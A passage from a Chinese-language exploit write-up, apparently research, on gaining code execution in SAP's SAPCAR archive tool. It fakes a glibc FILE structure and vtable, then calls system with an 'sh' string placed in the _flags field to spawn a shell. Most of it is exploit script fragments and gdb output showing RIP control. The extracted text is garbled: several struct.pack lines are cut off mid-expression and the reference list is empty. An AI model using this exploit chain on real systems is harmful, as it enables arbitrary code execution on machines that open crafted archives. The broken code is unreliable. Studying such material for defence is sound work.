        return file_struct
    def build_IO_jump_t_vtable():
        vtable = ""
        vtable += struct.pack("" + "x00"*32 + "xd0xd0"))
        f._sapcar.files0[0].blocks.append(Raw(data))
        f.write()
    def main():
        write_exp(overwrite_FILE_pointer(BUF_ADDRESS + FILE_STRUCT_SIZE))
    if __name__ == "__main__":
    main()
我们创建了一个新的文档，然后再次运行代码。这一次我们将控制RIP并重定向执行流：
    Stopped reason: SIGSEGV
    0x0000000041424344 in ?? ()
    gdb-peda$ bt
    #0  0x0000000041424344 in ?? ()
    #1  0x00007ffff6bb129f in _IO_new_fclose (fp=0xa1c870) at iofclose.c:62
    #2  0x000000000040c58b in ?? ()
    #3  0x000000000041958b in ?? ()
    #4  0x000000000042bc43 in ?? ()
    #5  0x000000000043fc66 in ?? ()
    #6  0x00007ffff6b64830 in __libc_start_main (main=0x43ffb0, argc=0x3, argv=0x7fffffffe488, init=, fini=, rtld_fini=, stack_end=0x7fffffffe478)
    at ../csu/libc-start.c:291
除此之外，我们还可以检查文件指针来确定我们伪造的结构体存储正确了：
    gdb-peda$ p *(FILE *)0xa1c870
    $1 = {
      _flags = 0x80018001, 
      _IO_read_ptr = 0x41414141 , 
      _IO_read_end = 0x42424242 , 
      _IO_read_base = 0x43434343 , 
      _IO_write_base = 0x44444444 , 
      _IO_write_ptr = 0x45454545 , 
      _IO_write_end = 0x46464646 , 
      _IO_buf_base = 0x47474747 , 
      _IO_buf_end = 0x48484848 , 
      _IO_save_base = 0x49494949 , 
      _IO_backup_base = 0x50505050 , 
      _IO_save_end = 0x51515151 , 
      _markers = 0x52525252, 
      _chain = 0x53535353, 
      _fileno = 0x54545454, 
      _flags2 = 0x55555555, 
      _old_offset = 0x56565656, 
      _cur_column = 0x5757, 
      _vtable_offset = 0x58, 
      _shortbuf = "", 
      _lock = 0x60606060, 
      _offset = 0x61616161, 
      _codecvt = 0x62626262, 
      _wide_data = 0x63636363, 
      _freeres_list = 0x64646464, 
      _freeres_buf = 0x65656565, 
      __pad5 = 0x66666666, 
      _mode = 0x67676767, 
      _unused2 = 'A' 
    }
**4.3 生成Shell**
成功控制了执行流之后，我们有多种方法来生成Shell。其中一种针对懒人的方法可以通过system("/bin/sh")实现。具体如下：
    $ objdump -M intel -d sapcar_721.510_linux_x86_64 | grep ""
    000000000040bbe0 :
      455db1: e8 2a 5e fb ff         call   40bbe0 
此时，我们可以看到RDI寄存器中的指针指向的是伪造FILE结构中的标识字符串：
    Stopped reason: SIGSEGV
    0x0000000041424344 in ?? ()
    gdb-peda$ x/xg $rdi
    0xa1c870:  0x0000000080018001
这也就意味着我们可以在这个缓冲区中存在一个sh字符串，然后重定向执行流并让它调用system命令来拿到Shell。
如果我们修改完后执行程序，我们会发现系统将抛出一个错误（_IO_feof中的分段错误）：
    => 0x7ffff6bb9912 :  cmp    r10,QWORD PTR [r8+0x8]
    gdb-peda$ info r r8
    r8             0x60606060  0x60606060
这是因为我们修改了标识符，而此时文件函数将会尝试访问_lock指针。我们可以使用之前正确的标识符并在后面添加“;sh”来执行Shell。
修改如下：
    file_struct += "x01x80;shx00x00x00" # _flags
然后修改vtable指针：
    vtable += struct.pack("
[2] 
[3] 
[4] 
[5] 
[6] 
[7] 
[8] 
[9] 
[10] 
[11]